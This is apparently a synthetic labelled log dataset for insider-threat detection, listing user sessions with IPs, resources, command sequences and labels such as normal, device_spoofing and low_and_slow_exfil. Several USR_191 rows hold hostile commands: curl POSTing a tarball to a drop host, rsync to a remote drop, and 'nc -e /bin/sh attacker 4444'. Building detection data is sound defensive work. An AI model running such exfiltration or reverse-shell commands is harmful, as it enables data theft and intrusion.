entity_id,entity_type,timestamp,source_ip,geo_location,resource_accessed,auth_method,session_duration,command_sequence,device_fingerprint,label
USR_189,user,2026-07-22 18:41:33,10.110.34.101,"Chicago, US",/db/production/customers,mfa,253.6,"[""ls"", ""cd /home"", ""cat README""]",ChromeOS/01:02:03:04:05:01,normal
USR_189,user,2026-07-23 13:10:09,172.17.191.142,"Seattle, US",/api/v1/reports/financial,mfa,141.1,"[""aws s3 ls s3://bucket"", ""aws ec2 describe-instances""]",ChromeOS/01:02:03:04:05:01,normal
USR_189,user,2026-07-23 15:27:15,172.29.40.201,"Chicago, US",/api/v1/admin/permissions,mfa,225.4,"[""docker ps -a"", ""docker logs webapp""]",ChromeOS/01:02:03:04:05:01,normal
USR_189,user,2026-07-23 17:28:18,172.23.1.159,"Chicago, US",/api/v1/admin/permissions,mfa,230.2,"[""vim config.yml"", ""grep -r 'pattern' src/"", ""awk '{print $1}'""]",ChromeOS/01:02:03:04:05:01,normal
USR_189,user,2026-07-23 18:00:14,172.29.155.59,"Chicago, US",/api/v1/users/bulk-export,mfa,144.6,"[""ssh bastion01"", ""scp report.csv user@host:/data""]",ChromeOS/01:02:03:04:05:01,normal
USR_190,user,2026-07-10 13:39:21,177.117.201.248,"Dubai, AE",/api/v1/logs/audit,password,80.1,"[""kubectl get pods"", ""kubectl logs deployment/api""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-10 14:50:47,142.41.241.158,"Dubai, AE",/storage/archive/2024,password,107.2,"[""vim config.yml"", ""grep -r 'pattern' src/"", ""awk '{print $1}'""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-11 10:01:42,192.168.168.204,"Austin, US",/api/v1/admin/permissions,password,176.3,"[""python pipeline.py"", ""pip list --outdated""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-11 12:04:30,196.211.38.78,"Dubai, AE",/api/v1/data/export,password,128.4,"[""kubectl get pods"", ""kubectl logs deployment/api""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-11 15:14:43,10.10.50.241,"Austin, US",/file/hr/payroll.xlsx,password,227.2,"[""docker ps -a"", ""docker logs webapp""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-12 09:51:06,161.3.243.164,"Dubai, AE",/api/v1/logs/audit,password,44.6,"[""aws s3 ls s3://bucket"", ""aws ec2 describe-instances""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-12 16:13:46,220.34.79.36,"Dubai, AE",/file/hr/payroll.xlsx,password,195.8,"[""SELECT * FROM users"", ""INSERT INTO audit_log""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-12 17:27:25,192.168.107.193,"Austin, US",/file/hr/payroll.xlsx,password,226.6,"[""ls"", ""cd /home"", ""cat README""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-12 17:28:17,26.170.75.194,"Dubai, AE",/api/v1/logs/audit,password,64.0,"[""git pull origin main"", ""make build"", ""make test""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-13 11:26:19,181.6.21.255,"Dubai, AE",/storage/archive/2024,password,216.7,"[""python pipeline.py"", ""pip list --outdated""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-13 12:31:06,143.234.195.29,"Dubai, AE",/db/staging/analytics,password,80.9,"[""docker ps -a"", ""docker logs webapp""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-13 13:05:30,165.251.105.138,"Dubai, AE",/db/staging/analytics,password,188.9,"[""aws s3 ls s3://bucket"", ""aws ec2 describe-instances""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-13 19:44:12,215.86.181.62,"Dubai, AE",/file/hr/payroll.xlsx,password,118.8,"[""docker ps -a"", ""docker logs webapp""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-14 09:18:22,65.72.37.21,"Dubai, AE",/db/staging/analytics,password,193.1,"[""ssh bastion01"", ""scp report.csv user@host:/data""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-14 13:16:58,220.187.231.57,"Dubai, AE",/db/staging/analytics,password,188.4,"[""kubectl get pods"", ""kubectl logs deployment/api""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-14 17:56:03,146.30.36.94,"Dubai, AE",/file/hr/payroll.xlsx,password,183.8,"[""docker ps -a"", ""docker logs webapp""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-15 09:42:21,143.211.232.12,"Dubai, AE",/db/staging/analytics,password,111.9,"[""git pull origin main"", ""make build"", ""make test""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-15 15:32:20,192.168.43.122,"Austin, US",/api/v1/logs/audit,password,64.1,"[""ls"", ""cd /home"", ""cat README""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-15 17:32:15,180.50.188.14,"Dubai, AE",/db/staging/analytics,password,76.8,"[""ssh bastion01"", ""scp report.csv user@host:/data""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-15 17:51:57,105.250.112.230,"Dubai, AE",/storage/archive/2024,password,177.1,"[""python pipeline.py"", ""pip list --outdated""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-16 14:03:09,10.212.172.176,"Austin, US",/api/v1/admin/permissions,password,27.7,"[""aws s3 ls s3://bucket"", ""aws ec2 describe-instances""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-17 11:07:11,25.253.117.65,"Dubai, AE",/api/v1/data/export,password,165.5,"[""vim config.yml"", ""grep -r 'pattern' src/"", ""awk '{print $1}'""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-17 13:49:55,57.8.44.138,"Dubai, AE",/api/v1/admin/permissions,password,95.0,"[""npm run build"", ""npm test -- --coverage""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-17 17:28:04,129.127.232.188,"Dubai, AE",/api/v1/data/export,password,130.0,"[""ls"", ""cd /home"", ""cat README""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-17 19:24:17,73.183.222.213,"Dubai, AE",/db/staging/analytics,password,190.5,"[""SELECT * FROM users"", ""INSERT INTO audit_log""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-18 09:13:30,111.138.219.24,"Dubai, AE",/db/staging/analytics,password,73.8,"[""ssh bastion01"", ""scp report.csv user@host:/data""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-18 10:51:21,14.58.124.144,"Dubai, AE",/api/v1/data/export,password,229.8,"[""kubectl get pods"", ""kubectl logs deployment/api""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-18 13:26:39,140.248.125.189,"Dubai, AE",/storage/archive/2024,password,100.1,"[""ls"", ""cd /home"", ""cat README""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-18 18:07:42,133.244.187.249,"Dubai, AE",/file/hr/payroll.xlsx,password,207.5,"[""vim config.yml"", ""grep -r 'pattern' src/"", ""awk '{print $1}'""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-19 09:49:55,33.151.212.17,"Dubai, AE",/api/v1/data/export,password,54.0,"[""docker ps -a"", ""docker logs webapp""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-19 10:34:05,134.249.2.234,"Dubai, AE",/storage/archive/2024,password,138.2,"[""vim config.yml"", ""grep -r 'pattern' src/"", ""awk '{print $1}'""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-19 10:38:18,212.153.198.44,"Dubai, AE",/api/v1/logs/audit,password,140.2,"[""aws s3 ls s3://bucket"", ""aws ec2 describe-instances""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-19 10:40:36,159.207.107.111,"Dubai, AE",/file/hr/payroll.xlsx,password,27.5,"[""ssh bastion01"", ""scp report.csv user@host:/data""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-19 15:40:50,198.152.107.106,"Dubai, AE",/file/hr/payroll.xlsx,password,98.3,"[""docker ps -a"", ""docker logs webapp""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-19 17:00:06,167.39.66.231,"Dubai, AE",/api/v1/data/export,password,32.7,"[""ssh bastion01"", ""scp report.csv user@host:/data""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-19 18:14:13,192.168.190.215,"Austin, US",/api/v1/admin/permissions,password,98.2,"[""npm run build"", ""npm test -- --coverage""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-19 19:25:00,202.231.143.250,"Dubai, AE",/api/v1/data/export,password,193.2,"[""npm run build"", ""npm test -- --coverage""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-19 19:25:44,143.167.193.166,"Dubai, AE",/storage/archive/2024,password,228.5,"[""npm run build"", ""npm test -- --coverage""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-20 10:42:52,223.172.137.22,"Dubai, AE",/file/hr/payroll.xlsx,password,192.3,"[""kubectl get pods"", ""kubectl logs deployment/api""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-20 11:48:53,203.187.128.132,"Dubai, AE",/api/v1/logs/audit,password,213.0,"[""docker ps -a"", ""docker logs webapp""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-20 16:05:32,192.168.72.92,"Austin, US",/db/staging/analytics,password,188.9,"[""python pipeline.py"", ""pip list --outdated""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-20 17:00:41,191.39.8.53,"Dubai, AE",/storage/archive/2024,password,149.2,"[""SELECT * FROM users"", ""INSERT INTO audit_log""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-21 10:38:27,24.16.148.82,"Dubai, AE",/api/v1/data/export,password,51.0,"[""aws s3 ls s3://bucket"", ""aws ec2 describe-instances""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-21 11:04:48,149.159.163.29,"Dubai, AE",/api/v1/admin/permissions,password,78.1,"[""docker ps -a"", ""docker logs webapp""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-21 18:55:55,90.4.168.95,"Dubai, AE",/storage/archive/2024,password,26.9,"[""ls"", ""cd /home"", ""cat README""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-22 11:45:28,192.168.255.231,"Austin, US",/storage/archive/2024,password,134.3,"[""vim config.yml"", ""grep -r 'pattern' src/"", ""awk '{print $1}'""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-22 19:04:59,107.88.251.115,"Dubai, AE",/db/staging/analytics,password,124.6,"[""npm run build"", ""npm test -- --coverage""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-23 09:24:37,158.233.105.119,"Dubai, AE",/storage/archive/2024,password,220.8,"[""vim config.yml"", ""grep -r 'pattern' src/"", ""awk '{print $1}'""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-23 10:10:07,192.168.41.177,"Austin, US",/api/v1/data/export,password,137.2,"[""ls"", ""cd /home"", ""cat README""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-23 10:57:07,113.61.117.77,"Dubai, AE",/file/hr/payroll.xlsx,password,174.9,"[""kubectl get pods"", ""kubectl logs deployment/api""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-23 11:57:26,172.23.139.45,"Austin, US",/file/hr/payroll.xlsx,password,46.2,"[""ls"", ""cd /home"", ""cat README""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-23 17:49:31,39.198.74.95,"Dubai, AE",/api/v1/logs/audit,password,172.9,"[""SELECT * FROM users"", ""INSERT INTO audit_log""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_190,user,2026-07-23 18:59:14,128.223.57.102,"Dubai, AE",/api/v1/admin/permissions,password,30.7,"[""docker ps -a"", ""docker logs webapp""]",iOS-17/FE:DC:BA:98:76:01,normal
USR_191,user,2026-07-10 02:58:00,10.175.153.33,"Austin, US",/api/v1/users/bulk-export,password,2.2,"[""tar czf exfil.tar.gz /data/sensitive"", ""curl -X POST https://drop.io -d @exfil.tar.gz"", ""base64 -w0 dump.sql""]",RHEL-9/CA:FE:BA:BE:00:01,low_and_slow_exfil
USR_191,user,2026-07-10 11:14:07,10.58.50.62,"Austin, US",/db/production/customers,password,88.6,"[""docker ps -a"", ""docker logs webapp""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-10 19:44:32,10.253.136.211,"Austin, US",/api/v1/reports/financial,password,106.6,"[""git pull origin main"", ""make build"", ""make test""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-11 04:24:00,192.168.203.99,"Austin, US",/storage/backup/full,password,6.3,"[""tar czf exfil.tar.gz /data/sensitive"", ""curl -X POST https://drop.io -d @exfil.tar.gz"", ""base64 -w0 dump.sql""]",RHEL-9/CA:FE:BA:BE:00:01,low_and_slow_exfil
USR_191,user,2026-07-11 15:40:06,10.249.113.105,"Austin, US",/api/v1/reports/financial,password,83.3,"[""npm run build"", ""npm test -- --coverage""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-12 01:11:00,172.16.18.130,"Austin, US",/api/v1/data/export,password,14.4,"[""rsync -avz /sensitive/ remote:/drop/"", ""nc -e /bin/sh attacker 4444""]",RHEL-9/CA:FE:BA:BE:00:01,low_and_slow_exfil
USR_191,user,2026-07-12 09:22:10,10.214.23.104,"Austin, US",/file/engineering/source.tar.gz,password,13.5,"[""ls"", ""cd /home"", ""cat README""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-13 01:31:00,192.168.49.45,"Austin, US",/storage/backup/full,password,7.4,"[""rsync -avz /sensitive/ remote:/drop/"", ""nc -e /bin/sh attacker 4444""]",RHEL-9/CA:FE:BA:BE:00:01,low_and_slow_exfil
USR_191,user,2026-07-13 08:12:05,169.148.43.126,"Sydney, AU",/api/v1/reports/financial,password,211.6,"[""aws s3 ls s3://bucket"", ""aws ec2 describe-instances""]",Ubuntu-22/DE:AD:BE:EF:00:02,device_spoofing
USR_191,user,2026-07-13 09:33:07,172.19.195.62,"Austin, US",/api/v1/keys/rotate,password,85.6,"[""git pull origin main"", ""make build"", ""make test""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-14 01:07:00,172.27.116.115,"Austin, US",/api/v1/users/bulk-export,password,14.1,"[""tar czf exfil.tar.gz /data/sensitive"", ""curl -X POST https://drop.io -d @exfil.tar.gz"", ""base64 -w0 dump.sql""]",RHEL-9/CA:FE:BA:BE:00:01,low_and_slow_exfil
USR_191,user,2026-07-14 09:16:16,172.98.179.167,"Tokyo, JP",/api/v1/keys/rotate,password,91.0,"[""npm run build"", ""npm test -- --coverage""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-14 18:20:16,200.144.233.253,"Tokyo, JP",/db/production/customers,password,63.6,"[""docker ps -a"", ""docker logs webapp""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-14 18:31:58,192.168.190.70,"Austin, US",/file/engineering/source.tar.gz,password,32.7,"[""npm run build"", ""npm test -- --coverage""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-15 02:02:00,192.168.52.27,"Austin, US",/api/v1/data/export,password,12.1,"[""rsync -avz /sensitive/ remote:/drop/"", ""nc -e /bin/sh attacker 4444""]",RHEL-9/CA:FE:BA:BE:00:01,low_and_slow_exfil
USR_191,user,2026-07-15 09:37:43,182.138.243.143,"Tokyo, JP",/db/production/customers,password,89.9,"[""npm run build"", ""npm test -- --coverage""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-16 02:10:00,10.208.191.124,"Austin, US",/api/v1/data/export,password,8.6,"[""tar czf exfil.tar.gz /data/sensitive"", ""curl -X POST https://drop.io -d @exfil.tar.gz"", ""base64 -w0 dump.sql""]",RHEL-9/CA:FE:BA:BE:00:01,low_and_slow_exfil
USR_191,user,2026-07-16 11:44:29,192.168.190.20,"Austin, US",/db/production/customers,password,41.0,"[""vim config.yml"", ""grep -r 'pattern' src/"", ""awk '{print $1}'""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-16 19:39:40,207.198.225.160,"Tokyo, JP",/api/v1/reports/financial,password,98.5,"[""docker ps -a"", ""docker logs webapp""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-17 15:11:20,10.242.159.36,"Austin, US",/api/v1/secrets/vault,password,74.4,"[""npm run build"", ""npm test -- --coverage""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-17 15:38:05,10.91.195.123,"Austin, US",/api/v1/reports/financial,password,87.6,"[""kubectl get pods"", ""kubectl logs deployment/api""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-17 16:16:09,172.26.144.207,"Austin, US",/api/v1/reports/financial,password,105.3,"[""git pull origin main"", ""make build"", ""make test""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-17 18:42:01,203.162.165.151,"Tokyo, JP",/db/production/customers,password,69.0,"[""python pipeline.py"", ""pip list --outdated""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-18 13:31:08,10.2.222.82,"Austin, US",/api/v1/reports/financial,password,105.0,"[""vim config.yml"", ""grep -r 'pattern' src/"", ""awk '{print $1}'""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-18 15:08:38,192.168.234.204,"Austin, US",/api/v1/keys/rotate,password,102.7,"[""git pull origin main"", ""make build"", ""make test""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-18 15:08:49,172.30.255.138,"Austin, US",/api/v1/reports/financial,password,46.9,"[""ls"", ""cd /home"", ""cat README""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-18 17:08:17,219.54.232.199,"Tokyo, JP",/api/v1/keys/rotate,password,94.6,"[""aws s3 ls s3://bucket"", ""aws ec2 describe-instances""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-18 19:45:24,172.22.96.102,"Austin, US",/api/v1/reports/financial,password,39.0,"[""ls"", ""cd /home"", ""cat README""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-19 15:30:41,192.168.115.186,"Austin, US",/file/engineering/source.tar.gz,password,19.5,"[""docker ps -a"", ""docker logs webapp""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-19 21:40:05,199.33.9.126,"Toronto, CA",/db/production/transactions,password,210.0,"[""vim config.yml"", ""grep -r 'pattern' src/"", ""awk '{print $1}'""]",Windows-11/AA:BB:CC:DD:EE:02,device_spoofing
USR_191,user,2026-07-20 16:08:13,155.70.76.75,"Tokyo, JP",/file/engineering/source.tar.gz,password,78.7,"[""SELECT * FROM users"", ""INSERT INTO audit_log""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-20 16:47:31,182.42.28.193,"Tokyo, JP",/db/production/customers,password,11.5,"[""git pull origin main"", ""make build"", ""make test""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-21 10:28:11,205.158.230.132,"Tokyo, JP",/file/engineering/source.tar.gz,password,43.2,"[""ls"", ""cd /home"", ""cat README""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-21 11:12:21,192.168.188.11,"Austin, US",/api/v1/secrets/vault,password,41.2,"[""vim config.yml"", ""grep -r 'pattern' src/"", ""awk '{print $1}'""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-21 14:47:53,192.168.130.110,"Austin, US",/api/v1/reports/financial,password,90.8,"[""ssh bastion01"", ""scp report.csv user@host:/data""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-22 09:40:23,10.52.185.78,"Austin, US",/api/v1/secrets/vault,password,40.0,"[""git pull origin main"", ""make build"", ""make test""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-22 17:17:23,192.168.91.77,"Austin, US",/api/v1/keys/rotate,password,8.7,"[""aws s3 ls s3://bucket"", ""aws ec2 describe-instances""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-23 11:58:56,192.168.196.17,"Austin, US",/api/v1/reports/financial,password,34.1,"[""ssh bastion01"", ""scp report.csv user@host:/data""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_191,user,2026-07-23 19:09:15,172.20.13.245,"Austin, US",/api/v1/secrets/vault,password,19.7,"[""git pull origin main"", ""make build"", ""make test""]",RHEL-9/CA:FE:BA:BE:00:01,normal
USR_192,user,2026-07-10 08:50:52,184.223.33.44,"Seoul, KR",/api/v1/secrets/vault,sso,188.7,"[""git pull origin main"", ""make build"", ""make test""]",ChromeOS/01:02:03:04:05:01,normal
USR_192,user,2026-07-10 09:44:55,73.96.30.139,"Seoul, KR",/api/v1/secrets/vault,sso,15.1,"[""SELECT * FROM users"", ""INSERT INTO audit_log""]",ChromeOS/01:02:03:04:05:01,normal
USR_192,user,2026-07-10 10:43:53,78.214.81.215,"Seoul, KR",/api/v1/admin/permissions,sso,99.6,"[""python pipeline.py"", ""pip list --outdated""]",ChromeOS/01:02:03:04:05:01,normal
USR_192,user,2026-07-10 13:59:33,64.4.11.112,"Seoul, KR",/api/v1/logs/audit,sso,51.8,"[""kubectl get pods"", ""kubectl logs deployment/api""]",ChromeOS/01:02:03:04:05:01,normal
USR_192,user,2026-07-10 15:59:50,192.158.76.76,"Seoul, KR",/api/v1/secrets/vault,sso,108.9,"[""ssh bastion01"", ""scp report.csv user@host:/data""]",ChromeOS/01:02:03:04:05:01,normal
USR_192,user,2026-07-11 15:49:39,186.119.132.28,"Seoul, KR",/api/v1/secrets/vault,sso,169.0,"[""docker ps -a"", ""docker logs webapp""]",ChromeOS/01:02:03:04:05:01,normal
USR_192,user,2026-07-11 17:36:24,60.35.221.104,"Seoul, KR",/api/v1/logs/audit,sso,179.2,"[""SELECT * FROM users"", ""INSERT INTO audit_log""]",ChromeOS/01:02:03:04:05:01,normal
USR_192,user,2026-07-11 17:57:47,131.87.17.81,"Seoul, KR",/api/v1/admin/permissions,sso,22.2,"[""git pull origin main"", ""make build"", ""make test""]",ChromeOS/01:02:03:04:05:01,normal
USR_192,user,2026-07-12 08:57:29,165.18.81.38,"Seoul, KR",/api/v1/admin/permissions,sso,142.6,"[""SELECT * FROM users"", ""INSERT INTO audit_log""]",ChromeOS/01:02:03:04:05:01,normal
USR_192,user,2026-07-12 11:18:47,187.92.23.107,"Seoul, KR",/api/v1/logs/audit,sso,31.8,"[""docker ps -a"", ""docker logs webapp""]",ChromeOS/01:02:03:04:05:01,normal
USR_192,user,2026-07-12 11:32:33,56.37.214.240,"Seoul, KR",/api/v1/admin/permissions,sso,34.9,"[""python pipeline.py"", ""pip list --outdated""]",ChromeOS/01:02:03:04:05:01,normal
USR_192,user,2026-07-12 14:18:49,135.129.201.42,"Seoul, KR",/api/v1/secrets/vault,sso,180.2,"[""vim config.yml"", ""grep -r 'pattern' src/"", ""awk '{print $1}'""]",ChromeOS/01:02:03:04:05:01,normal
USR_192,user,2026-07-13 07:15:16,214.216.67.120,"Seoul, KR",/api/v1/secrets/vault,sso,79.5,"[""npm run build"", ""npm test -- --coverage""]",ChromeOS/01:02:03:04:05:01,normal
USR_192,user,2026-07-13 13:58:24,221.253.229.139,"Seoul, KR",/api/v1/admin/permissions,sso,14.9,"[""SELECT * FROM users"", ""INSERT INTO audit_log""]",ChromeOS/01:02:03:04:05:01,normal
USR_192,user,2026-07-13 15:30:10,14.56.206.13,"Seoul, KR",/api/v1/logs/audit,sso,204.4,"[""python pipeline.py"", ""pip list --outdated""]",ChromeOS/01:02:03:04:05:01,normal
